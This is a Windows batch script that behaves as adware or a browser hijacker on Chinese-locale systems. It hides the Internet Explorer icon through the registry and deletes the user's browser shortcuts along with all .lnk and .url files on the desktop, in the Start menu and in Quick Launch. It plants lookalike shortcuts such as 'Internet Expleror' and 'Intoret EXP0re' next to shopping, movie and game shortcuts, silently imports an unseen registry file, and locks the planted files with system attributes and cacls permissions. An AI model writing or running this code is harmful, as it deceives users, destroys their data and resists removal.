cls
@echo off
 Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{871C5380-42A0-1069-A2EA-08002B30309D}" /t "REG_DWORD" /d "1" /f
Set "TMPINF=C:\TmpInf.inf"
echo [Version] >%TMPINF%
echo Signature="$Windows NT$" >>%TMPINF%
echo [DefaultInstall] >>%TMPINF%
RUNDLL32 SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 %TMPINF%
del %TMPINF%

 
del "%userprofile%\桌面\IEXPLORE.lnk"
del "%userprofile%\桌面\IEXPLOREr.lnk"
del "%userprofile%\桌面\Internet Exporer.lnk" /f/q/a
del "%userprofile%\桌面\Internet Explorer.lnk" /f/q/a
del "%userprofile%\桌面\Internet Exp1orer.lnk"
del "%userprofile%\桌面\Internet Explorer.lnk" 
del "%userprofile%\桌面\Internet*.lnk"  /f/q/a
del "%userprofile%\桌面\*Internet*.lnk" /f/q/a
 
del  "C:\Documents and Settings\All Users\桌面\Internet Explorer.lnk" /f/q/a
del  "C:\Documents and Settings\All Users\桌面\Internet*.lnk" /f/q/a
del  "C:\Documents and Settings\All Users\桌面\*Internet*.lnk" /f/q/a


del "%userprofile%\「开始」菜单\程序\Internet*.lnk"  /f/q/a
del "%userprofile%\「开始」菜单\程序\*Internet*.lnk" /f/q/a


del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk" /f/q/a
del "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.url" /f/q/a
del "%userprofile%\桌面\*.url"     /f/q/a
del  "C:\Documents and Settings\All Users\桌面\*.url" /f/q/a

del   "%userprofile%\「开始」菜单\*.url"   /f/q/a
del   "%userprofile%\「开始」菜单\*.lnk"  /f/q/a
del  "C:\Documents and Settings\All Users\「开始」菜单\*.url" /f/q/a
del  "C:\Documents and Settings\All Users\「开始」菜单\*.lnk" /f/q/a

 
 
 
 
copy "淘宝购物.lnk" "%userprofile%\「开始」菜单\淘宝购物.lnk" /y
copy "免费电影.lnk" "%userprofile%\「开始」菜单\免费电影.lnk" /y
 
copy "yx.lnk" "%userprofile%\「开始」菜单\小游戏.lnk" /y
 

copy "taobao.lnk" "%userprofile%\Favorites\淘宝购物.lnk" /y
copy "免费电影.lnk" "%userprofile%\Favorites\免费电影.lnk" /y
copy "yx.lnk" "%userprofile%\Favorites\小游戏.lnk" /y 
 
copy "Inonet.lnk" "%userprofile%\桌面\Internet Expleror.lnk" /y
copy "Inonet.lnk" "%userprofile%\「开始」菜单\网址之家.lnk" /y
copy "Inonet.lnk" "%userprofile%\「开始」菜单\程序\酷站大全.lnk" /y 
  
copy "Inonet.lnk" "%userprofile%\「开始」菜单\Internet Expleror.lnk" /y
copy "Inonet.lnk" "%userprofile%\「开始」菜单\程序\Internet Expleror.lnk" /y
copy "Inonet.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Intoret EXP0re.lnk" /y
 
 copy "yx.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\小游戏.lnk" /y
  copy "免费电影.lnk" "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\免费电影.lnk" /y
 
regedit /s ss.reg

 
 
 attrib  "%USERPROFILE%\桌面\Internet Expleror.lnk"  +R +S

 attrib "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\*.lnk"  +R +S
attrib  "%userprofile%\「开始」菜单\网址之家.lnk" +R +S




 attrib  "%USERPROFILE%\桌面\淘宝购物.lnk"  +R +S
attrib  "%USERPROFILE%\桌面\免费电影.lnk"  +R +S
attrib  "%USERPROFILE%\桌面\小游戏.lnk"  +R +S
 

 
attrib  "%userprofile%\「开始」菜单\淘宝购物.lnk" +R +S
attrib  "%userprofile%\「开始」菜单\免费电影.lnk" +R +S
 
attrib  "%userprofile%\「开始」菜单\小游戏.lnk" +R +S
echo y| cacls "%userprofile%\桌面\Internet Expleror.lnk"   /p everyone:R
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\Intoret EXP0re.lnk"  /p everyone:R
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\小游戏.lnk"  /p everyone:R
echo y| cacls "%userprofile%\Application Data\Microsoft\Internet Explorer\Quick Launch\免费电影.lnk"  /p everyone:R
echo y| cacls "%userprofile%\桌面\小游戏.lnk"   /p everyone:R
echo y| cacls "%userprofile%\桌面\淘宝购物.lnk"   /p everyone:R
echo y| cacls "%userprofile%\「开始」菜单\Internet Expleror.lnk"   /p everyone:R
echo y| cacls "%userprofile%\「开始」菜单\小游戏.lnk"   /p everyone:R
echo y| cacls "%userprofile%\「开始」菜单\免费电影.lnk"   /p everyone:R

exit